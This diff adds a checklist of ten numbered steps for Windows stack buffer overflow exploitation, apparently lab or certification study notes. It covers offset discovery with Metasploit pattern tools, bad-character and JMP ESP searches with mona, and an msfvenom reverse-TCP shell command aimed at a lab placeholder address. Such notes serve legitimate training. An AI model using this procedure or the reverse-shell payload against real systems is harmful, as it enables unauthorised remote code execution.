@@ -1,0 +1,34 @@
+#step 1, find the overflow length 
+how many 'Z' it takes to crash the program
+
+#step 2, find the length to hit EIP, generate length with the following
+/usr/bin/msf-pattern_create
+
+#step 3, find offset with the following
+/usr/bin/msf-pattern_offset
+
+#step 4, send extra chars to confirm if you do have control of EIP by filling it with different value (B)
+
+#step 5, send char stack AND the Letters, add characters to template that cause the stack to corrupt until the hexdump matches
+Compare all bad chars generated and then ESP address in the crashed program vs hexdump of the written file
+!mona compare -a esp -f c:\badchar_test.bin
+
+#step 6, find a way to jump into ESP with !mona jmp -r ESP, set it into the var below
+
+Look for jump esp instruction excluding badchars
+!mona jmp -r esp -cpb "\x00\x0A"
+
+#step 7, generate shell code
+#msfvenom -p windows/shell/reverse_tcp LPORT=1337 LHOST=10.11.0.X -b '\x00' -f ruby
+#remember to insert the bad characters in the -b section
+# TAKE NOTE OF HOW BIG YOUR SHELL CODE IS
+
+#step 8, generate space with metasm that is a little biggrt than the unpacked space of your shell code.
+#not a bad idea to make it the same size as the unpacked code too
+#add esp, -1650 was good in this instance
+# DO NOT FLIP THIS ADDRESS!
+#If you get stackoverflow errors, take the space out and put a bunch of \x90 or TESTSTRINGS in to pad.
+
+#step 9, pack in the shell code generated above
+
+#step 10, make sure to catch with a multi/handler in msfconsole
